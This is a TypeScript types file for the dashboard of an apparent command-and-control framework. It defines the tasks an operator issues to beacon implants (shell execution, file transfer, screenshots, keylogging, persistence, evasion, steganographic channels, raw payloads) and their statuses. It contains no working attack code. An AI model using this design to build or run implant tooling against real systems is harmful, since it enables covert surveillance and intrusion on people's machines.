// dashboard/src/types/task.ts

import type { TentacleId } from './beacon';

/** The kind of task the operator is issuing to a beacon. */
export type TaskKind =
  // Server kinds — must match server's TaskKind spelling exactly
  | 'shell'        // Run a shell command
  | 'upload'       // Push a file to the target
  | 'download'     // Pull a file from the target
  | 'screenshot'   // Capture screen (if supported)
  | 'keylog'       // Toggle keylogger (if supported)
  | 'persist'      // Install persistence mechanism
  | 'unpersist'    // Remove persistence mechanism
  | 'sleep'        // Change beacon sleep interval
  | 'die'          // Terminate the implant (NOTE: 'die' not 'exit')
  | 'load-module'   // Load a module into the implant
  | 'evasion'       // Evasion/persistence operation
  | 'openhulud'     // OpenHulud evasion primitive
  | 'stego'         // Steganography channel task
  // Dashboard-only kinds — no server equivalent
  | 'custom';      // Raw payload, interpreted by implant

export type TaskStatus =
  // Server states — must match server's TaskState spelling exactly
  | 'pending'    // Queued, not yet picked up by beacon
  | 'delivered'  // Beacon acknowledged receipt
  | 'completed'  // Beacon returned a result (NOTE: 'completed' not 'complete')
  | 'failed'     // Beacon returned an error
  // Dashboard-only states — computed/derived in the UI
  | 'running'    // Optimistic — beacon reported start but no result yet
  | 'timeout'    // TTL expired with no response (dashboard-computed)
  | 'cancelled'; // Operator cancelled before pickup (dashboard action)

export interface Task {
  /** Unique task ID (UUID or GitHub comment ID). */
  id: string;
  /** ID of the beacon this task is addressed to. */
  beaconId: string;
  /** The type of operation to perform. */
  kind: TaskKind;
  /**
   * Task arguments — shape depends on kind:
   *   shell:    { cmd: string }
   *   upload:   { remotePath: string; content: string }  (base64)
   *   download: { remotePath: string }
   *   sleep:    { intervalMs: number }
   *   custom:   { payload: string }
   */
  args: Record<string, unknown>;
  /** Current lifecycle status. */
  status: TaskStatus;
  /** ISO 8601 — when the operator issued the task. */
  createdAt: string;
  /** ISO 8601 — when status last changed. */
  updatedAt: string;
  /** ISO 8601 — deadline; task is timed-out after this. */
  expiresAt?: string;
  /** Which tentacle channel was used to deliver this task. */
  deliveredViaTentacle?: TentacleId;
}
